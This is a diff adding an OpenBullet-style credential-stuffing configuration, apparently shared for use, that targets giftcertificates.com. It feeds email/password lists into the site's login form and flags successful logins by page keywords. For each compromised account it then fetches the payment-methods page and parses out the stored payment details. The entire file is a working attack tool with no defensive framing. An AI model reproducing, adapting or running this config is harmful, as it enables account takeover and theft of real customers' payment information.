@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "gcates",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-30T09:02:26.7729099+00:00",
+  "AdditionalInfo": "",
+  "Author": "leehzet",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.giftcertificates.com/login.aspx" AutoRedirect=TRUE 
+  CONTENT "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTkxMTE0NzE1NA9kFgJmD2QWAgIDD2QWCgILDw8WAh4HVmlzaWJsZWdkFgICAw8WAh4EVGV4dAUSMSBpdGVtKHMpOiAkMTAwLjAwZAIVDxYCHwEFSDxzdHJvbmc%2BIDxhIGhyZWY9Ii9sb2dpbi5hc3B4Ij5TaWduIGluIG9yIGNyZWF0ZSBhbiBhY2NvdW50PC9hPjwvc3Ryb25nPmQCGw9kFgICBQ8PZBYCHgdvbkZvY3VzBTBpZih0aGlzLnZhbHVlPT0nS2V5d29yZCBvciBJdGVtIycpdGhpcy52YWx1ZT0nJztkAh8PZBYCAgMPZBYCAgEPDxYCHwFlZGQCOw9kFgICAQ8WAh8BBV08ZGl2IGNsYXNzPSJkaXNjbGFpbWVyIj4gIDxwIGNsYXNzPSJmb290ZXJSb3cyIj4mY29weTsyMDE1IEdpZnRDZXJ0aWZpY2F0ZXMuY29tPC9wPiAgPC9kaXY%2BICBkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYEBRJjdGwwMCRJbWFnZUJ1dHRvbjEFGmN0bDAwJE1haW5Db250ZW50JGltZ2J0bkdvBR5jdGwwMCRNYWluQ29udGVudCRJbWFnZUJ1dHRvbjIFHmN0bDAwJE1haW5Db250ZW50JEltYWdlQnV0dG9uMRwXXQ0CQLCmPlKavOf0hzyDp6rN&__VIEWSTATEGENERATOR=C2EE9ABB&ctl00%24searchField=Keyword+or+Item%23&ctl00%24MainContent%24txtUserName=<USER>&ctl00%24MainContent%24txtPassword=<PASS>&ctl00%24MainContent%24imgbtnGo.x=39&ctl00%24MainContent%24imgbtnGo.y=14&ctl00%24MainContent%24txtGuestFirstName=&ctl00%24MainContent%24txtGuestLastName=&ctl00%24MainContent%24txtGuestEmail=&ctl00%24MainContent%24txtGuestPhone=&ctl00%24isRedeem=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username/password" 
+  KEYCHAIN Success OR 
+    KEY ">Sign Out<" 
+REQUEST GET "https://www.giftcertificates.com/account/paymethods.aspx" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "te: </td>\n <td>" "<" Recursive=FALSE -> VAR "Payment" "" "" 
